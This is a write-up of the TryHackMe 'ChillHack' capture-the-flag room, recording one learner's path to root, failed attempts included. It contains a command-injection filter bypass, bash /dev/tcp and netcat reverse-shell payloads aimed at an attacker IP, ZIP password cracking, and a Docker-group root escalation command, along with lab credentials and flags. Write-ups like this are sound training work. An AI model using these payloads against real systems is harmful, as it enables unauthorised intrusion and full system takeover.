# 🧊 ChillHack — TryHackMe Writeup

> Full journey including all failed attempts and lessons learned.

---

## 📋 Table of Contents

- [🧊 ChillHack — TryHackMe Writeup](#-chillhack--tryhackme-writeup)
  - [📋 Table of Contents](#-table-of-contents)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. FTP Enumeration](#2-ftp-enumeration)
  - [3. Web Enumeration](#3-web-enumeration)
  - [4. Command Injection](#4-command-injection)
  - [5. Reverse Shell](#5-reverse-shell)
  - [6. Enumeration as www-data](#6-enumeration-as-www-data)
    - [❌ Failed Attempt 1 — Modify the Script](#-failed-attempt-1--modify-the-script)
  - [7. Privilege Escalation → apaar](#7-privilege-escalation--apaar)
    - [❌ Failed Attempt 2 — Reverse Shell via Script](#-failed-attempt-2--reverse-shell-via-script)
    - [✅ Correct Approach](#-correct-approach)
    - [🏁 User Flag](#-user-flag)
  - [8. Enumeration as apaar](#8-enumeration-as-apaar)
    - [❌ Failed Attempt 3 — Use DB Password as System Password](#-failed-attempt-3--use-db-password-as-system-password)
    - [❌ Failed Attempt 4 — Ignored the Hint](#-failed-attempt-4--ignored-the-hint)
    - [❌ Failed Attempt 5 — strings on the Image](#-failed-attempt-5--strings-on-the-image)
    - [❌ Failed Attempt 6 — Chased SSH/SUID Rabbit Holes](#-failed-attempt-6--chased-sshsuid-rabbit-holes)
  - [9. Steganography](#9-steganography)
  - [10. Crack the ZIP](#10-crack-the-zip)
  - [11. Decode the Password](#11-decode-the-password)
  - [12. Pivot to anurodh](#12-pivot-to-anurodh)
    - [❌ Failed Attempt 7 — Mental Block on Docker](#-failed-attempt-7--mental-block-on-docker)
  - [13. Root via Docker](#13-root-via-docker)
    - [🏁 Root Flag](#-root-flag)
  - [🧠 Final Lessons](#-final-lessons)
    - [❌ What Slowed Me Down](#-what-slowed-me-down)
    - [✅ What Went Right](#-what-went-right)
  - [🧨 Full Attack Chain](#-full-attack-chain)
  - [💀 Final Status](#-final-status)

---

## 1. Reconnaissance

```bash
nmap -sV -sC -A 10.49.143.76
```

**Open Ports:**

| Port | Service | Notes |
|------|---------|-------|
| 21   | FTP     | Anonymous login allowed |
| 22   | SSH     | Standard |
| 80   | HTTP    | Game Info page |

---

## 2. FTP Enumeration

**Login:**

```bash
ftp 10.49.143.76
# username: anonymous
# password: (blank)
```

**Commands:**

```bash
ls
get note.txt
```

**Contents of `note.txt`:**

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

> 💡 **Insight:** Command injection exists, but with string filtering in place.

---

## 3. Web Enumeration

```bash
gobuster dir -u http://10.49.143.76 -w directory-list-2.3-small.txt
```

**Discovered:**

```
/secret
```

---

## 4. Command Injection

Navigate to `/secret` and test for injection:

```
id
```

**Output:**

```
uid=33(www-data)
```

**Working payload (bypasses filter using `dig`):**

```
dig ; cat /etc/passwd
```

✅ **SUCCESS** — command injection confirmed.

---

## 5. Reverse Shell

**Payload:**

```bash
dig ;bash -c "bash -i >& /dev/tcp/192.168.156.191/4444 0>&1"
```

✅ Reverse shell obtained as `www-data`.

---

## 6. Enumeration as www-data

```bash
ls /home
# anurodh  apaar  aurick  ubuntu

cd /home/apaar
ls -la
# .helpline.sh
# local.txt
```

**Inspect the script:**

```bash
cat .helpline.sh
```

> The script executes user input via `$msg`.

### ❌ Failed Attempt 1 — Modify the Script

```bash
echo 'payload' > .helpline.sh
# Permission denied
```

> ❌ Script is not writable by `www-data`.

---

## 7. Privilege Escalation → apaar

```bash
sudo -l
# (www-data) → (apaar) NOPASSWD: /home/apaar/.helpline.sh
```

### ❌ Failed Attempt 2 — Reverse Shell via Script

Tried multiple payloads as input to `.helpline.sh`:

```bash
bash -i >& /dev/tcp/192.168.156.191/5555 0>&1
bash -c 'exec bash -i &>/dev/tcp/...'
sh -c 'sh -i > /dev/tcp/...'
nc 192.168.156.191 5555 -e /bin/bash
mkfifo /tmp/f ...
```

> ❌ All failed. Mistake: over-focused on reverse shell approach.

### ✅ Correct Approach

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

**Input when prompted:**

```
/bin/sh
```

**Upgrade the shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

✅ Shell obtained as `apaar`.

### 🏁 User Flag

```bash
cat /home/apaar/local.txt
# {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

---

## 8. Enumeration as apaar

```bash
cd /var/www/files
```

**Found in source code:**

```
root : !@m+her00+@db
```

### ❌ Failed Attempt 3 — Use DB Password as System Password

```bash
su root
# Failed
```

> ❌ DB password ≠ system password.

**Hint found:**

```
Look in the dark!
```

### ❌ Failed Attempt 4 — Ignored the Hint

> Initially dismissed the image on the web page.

### ❌ Failed Attempt 5 — strings on the Image

```bash
strings image.jpg
# Nothing useful
```

### ❌ Failed Attempt 6 — Chased SSH/SUID Rabbit Holes

> Checked `.ssh` directories and SUID binaries — dead ends.

> 💡 **Realization:** "Look in the dark" = hidden data inside the image → **Steganography**.

---

## 9. Steganography

```bash
steghide extract -sf image.jpg
```

✅ Extracted: `backup.zip`

---

## 10. Crack the ZIP

```bash
zip2john backup.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```

**Password:**

```
pass1word
```

**Extract:**

```bash
unzip backup.zip
# → source_code.php
```

---

## 11. Decode the Password

Inside `source_code.php`:

```php
base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA=="
```

**Decode:**

```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

**Result:**

```
!d0ntKn0wmYp@ssw0rd
```

---

## 12. Pivot to anurodh

```bash
su anurodh
# Password: !d0ntKn0wmYp@ssw0rd
```

✅ **SUCCESS**

**Check privileges:**

```bash
id
# groups=999(docker)
```

### ❌ Failed Attempt 7 — Mental Block on Docker

> Initially didn't recognize the significance of the `docker` group membership.

---

## 13. Root via Docker

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

✅ Root shell obtained.

```bash
id
# uid=0(root)
```

### 🏁 Root Flag

```bash
cat /root/proof.txt
# {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

---

## 🧠 Final Lessons

### ❌ What Slowed Me Down

- Overusing reverse shell attempts when simpler approaches existed
- Ignoring hints temporarily (the steganography clue)
- Assuming DB credentials would work as system credentials
- Getting distracted by SSH and SUID paths
- Not immediately recognising the significance of `docker` group membership

### ✅ What Went Right

- Eventually acted on hints
- Cracked the ZIP correctly using `zip2john` + `john`
- Understood the `.helpline.sh` script vulnerability
- Pivoted between users methodically
- Identified and exploited Docker group privilege

---

## 🧨 Full Attack Chain

```
FTP → Hint (note.txt) → Command Injection → Shell (www-data)
    → sudo .helpline.sh → apaar (User Flag)
    → /var/www/files → Stego (image.jpg) → backup.zip
    → zip2john + john → source_code.php → base64 decode
    → anurodh (docker group)
    → docker run -v /:/mnt → ROOT (Root Flag)
```

---

## 💀 Final Status

| Objective   | Status |
|-------------|--------|
| User Flag   | ✅ Captured |
| Root Flag   | ✅ Captured |
| Full Compromise | ✅ Complete |
